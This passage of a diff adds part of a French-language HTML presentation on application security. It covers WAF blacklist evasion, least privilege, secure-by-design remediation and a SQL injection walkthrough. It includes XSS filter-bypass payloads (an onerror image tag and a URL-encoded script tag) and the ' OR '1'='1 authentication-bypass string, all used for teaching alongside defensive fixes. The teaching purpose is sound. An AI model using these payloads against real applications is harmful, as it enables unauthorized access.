+                        <p>Les pare-feux applicatifs (WAF) ou les développeurs utilisent souvent des "listes noires" (Blacklists) naïves qui bloquent des mots spécifiques (ex: <code>SELECT</code>, <code>&lt;script&gt;</code>). Les attaquants utilisent l'<strong>obfuscation</strong> et l'encodage pour muter leur code malveillant afin de passer sous les radars.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Les moteurs de base de données et les navigateurs sont permissifs. Ils peuvent décoder à la volée des syntaxes complexes. L'encodage URL (Percent-encoding), l'Hexadécimal, la manipulation de casse ou le double-encodage sont utilisés pour fragmenter la signature de l'attaque.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box warning-box">
+                            <strong>Filtre en place :</strong> Le mot <code>script</code> est bloqué.<br><br>
+                            <strong>Contournement 1 (Changement de balise) :</strong><br>
+                            <code>&lt;img src="x" onerror="alert(1)"&gt;</code><br><br>
+                            <strong>Contournement 2 (Encodage URL dans un paramètre) :</strong><br>
+                            <code>%3Cscript%3Ealert%281%29%3C%2Fscript%3E</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-9" class="section prob-section">
+        <div class="container reveal slide-left">
+            <div class="prob-header">
+                <span class="prob-num">Prob 09</span>
+                <h3 class="glow-text">Quel est le rôle salvateur du principe de moindre privilège ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>En cybersécurité, il faut admettre qu'une compromission finira par arriver. Le principe de moindre privilège (Principle of Least Privilege - PoLP) agit comme une cloison étanche. Il garantit qu'un processus ne dispose que des droits strictement nécessaires à son fonctionnement légitime.</p>
+                        <h4>Explication Technique</h4>
+                        <p>Si une vulnérabilité d'entrée permet une RCE (exécution de commande), l'attaquant héritera des droits du processus compromis. Si le serveur web s'exécute en tant que super-administrateur (Root), le système entier est perdu. S'il s'exécute en tant qu'utilisateur restreint, l'impact (Blast Radius) est considérablement réduit.</p>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemple Concret</h4>
+                        <div class="code-box success-box">
+                            <strong>Mauvaise configuration :</strong><br>
+                            Service Apache tournant sous <code>root</code>. Une faille donne le contrôle total du serveur à l'attaquant.<br><br>
+                            <strong>Architecture sécurisée (PoLP) :</strong><br>
+                            Service Apache tournant sous l'utilisateur <code>www-data</code>. Même si l'attaquant exploite une faille, il ne pourra pas installer de backdoors persistantes ni lire les fichiers du noyau Linux.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="prob-10" class="section prob-section alt-bg">
+        <div class="container reveal slide-right">
+            <div class="prob-header">
+                <span class="prob-num">Prob 10</span>
+                <h3 class="glow-text">Quelles sont les stratégies d'éradication applicables dès la phase de conception ?</h3>
+            </div>
+            <div class="glass-card full-width-card">
+                <div class="prob-content">
+                    <div class="text-col">
+                        <h4>Réponse Académique</h4>
+                        <p>La remédiation pérenne nécessite l'implémentation du <strong>Secure Software Development Life Cycle (SSDLC)</strong>. Il faut passer d'une logique curative (corriger après l'attaque) à une logique d'architecture résiliente intégrée (Secure by Design).</p>
+                        <h4>Explication Technique</h4>
+                        <ul class="cyber-list">
+                            <li><strong>Listes Blanches (Whitelisting) :</strong> Définir exactement ce qui est autorisé via des expressions régulières strictes (Regex) plutôt que d'essayer de bloquer ce qui est mauvais.</li>
+                            <li><strong>Requêtes Préparées (Prepared Statements) :</strong> Sépare la structure SQL de la donnée, rendant l'injection mathématiquement impossible.</li>
+                            <li><strong>Analyse Statique (SAST) :</strong> Détection automatique des fonctions dangereuses (comme <code>sprintf</code>) dans le code source lors des pipelines d'intégration.</li>
+                        </ul>
+                    </div>
+                    <div class="example-col">
+                        <h4>Exemples de Remédiation</h4>
+                        <div class="code-box success-box">
+                            <strong>Correction Chaîne de format (C) :</strong><br>
+                            <span class="highlight-red">Non :</span> <code>printf(user_input);</code><br>
+                            <span class="highlight">Oui :</span> <code>printf("%s", user_input);</code><br><br>
+                            <strong>Correction Injection (Web) :</strong><br>
+                            Utilisation systémique d'ORM (Object-Relational Mapping) comme Doctrine ou Prisma, et de bibliothèques de nettoyage DOM comme DOMPurify pour bloquer les XSS.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="technique" class="section">
+        <div class="container reveal fade-in">
+            <h2 class="section-header">03. <span class="glow-text">Laboratoire Technique</span></h2>
+            
+            <div class="glass-card mb-4">
+                <h3 class="mb-3 glow-text" style="font-size: 1.8rem;">Analyse du flux d'une Injection SQL</h3>
+                <p class="lead">Déconstruction de la logique d'un moteur de base de données face à une entrée manipulée.</p>
+                <div class="code-box mt-4">
+                    <span class="comment">// 1. Le backend construit la requête de manière non sécurisée :</span><br>
+                    String query = "SELECT * FROM accounts WHERE username = '" + <span class="highlight">userInput</span> + "'";<br><br>
+                    <span class="comment">// 2. L'attaquant injecte une tautologie logique : admin' OR '1'='1</span><br>
+                    <span class="comment">// 3. La requête finale évaluée par le moteur SQL devient :</span><br>
+                    SELECT * FROM accounts WHERE username = 'admin' <span class="highlight-red">OR '1'='1'</span>;<br><br>
+                    <span class="comment">// Conclusion : 1 étant toujours égal à 1, la condition globale est VRAIE. Le bypass d'authentification est réussi.</span>
+                </div>
+            </div>
+
+            <div class="video-container glass-card mt-4">
+                <h3 class="text-center mb-4 glow-text">Démonstration d'Exploitation (Preuve de Concept - PoC)</h3>
+                <video controls preload="metadata">
+                    <source src="video/hack.mp4" type="video/mp4">
+                    Votre navigateur ne supporte pas la balise vidéo HTML5.
+                </video>
+            </div>
+        </div>
+    </section>
+
+    <section id="conclusion" class="section">
+        <div class="container reveal slide-up">
+            <h2 class="section-header">04. <span class="glow-text">Conclusion Synthétique</span></h2>
+            <div class="glass-card content-card text-center" style="border-top: 4px solid var(--neon-cyan);">
+                <p class="lead" style="font-size: 1.4rem;">L'intégrité d'une application est asymétrique : il suffit d'une seule entrée mal validée ou d'une chaîne de format mal implémentée pour compromettre des mois d'ingénierie logicielle.</p>
+                <p style="font-size: 1.15rem; color: var(--text-muted); padding: 0 5%;">La cybersécurité moderne exige un changement de paradigme fondamental. Les développeurs ne doivent plus traiter les données comme de simples variables, mais comme des <strong>vecteurs de menace potentiels</strong> nécessitant une isolation, une méfiance et une validation strictes à chaque couche de l'architecture logicielle.</p>
+            </div>
+        </div>
+    </section>
+
+    <footer id="merci" class="section final-section">
+        <div class="container reveal fade-in text-center">
+            <h1 class="glow-text huge-text">Fin de la transmission</h1>
+            <p class="pulse-text mt-2">L'équipe de recherche vous remercie pour votre attention.</p>
+            <div class="shield-icon mt-4">🛡️</div>
+            <p style="color: var(--text-muted); margin-top: 50px; font-family: var(--font-code); font-size: 0.9rem;">Ouverture de la session de Questions/Réponses [Awaiting_Input...]</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            
+            /**
+             * 1. ANIMATIONS D'APPARITION AU DÉFILEMENT (Intersection Observer)
+             * Gère l'effet fluide "fade-in", "slide-left", "slide-right" au scroll
+             */
+            const revealElements = document.querySelectorAll('.reveal');
+
+            const revealOptions = {
+                threshold: 0.1, // Déclenchement plus précoce pour plus de fluidité
+                rootMargin: "0px 0px -50px 0px"
+            };
+
+            const scrollObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('active');
+                    }
+                });
+            }, revealOptions);
+
+            revealElements.forEach(el => {
+                scrollObserver.observe(el);
+            });
+
+            /**
+             * 2. GESTION DE LA BARRE DE NAVIGATION (Glassmorphism Dynamique)
+             */
+            const navbar = document.getElementById('navbar');
+            
+            window.addEventListener('scroll', () => {
+                if (window.scrollY > 50) {
+                    navbar.style.padding = "0.8rem 5%";
+                    navbar.style.background = "rgba(1, 4, 9, 0.95)";
+                    navbar.style.boxShadow = "0 10px 30px rgba(0, 0, 0, 0.8)";
+                } else {
+                    navbar.style.padding = "1.2rem 5%";
+                    navbar.style.background = "rgba(1, 4, 9, 0.7)";
+                    navbar.style.boxShadow = "0 4px 30px rgba(0, 0, 0, 0.5)";
+                }
+            });
+
+            /**
+             * 3. DÉFILEMENT DOUX (Smooth Scroll)
+             */
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    const targetId = this.getAttribute('href');
+                    const targetElement = document.querySelector(targetId);
+                    
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 80, // Offset pour la navbar fixe
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
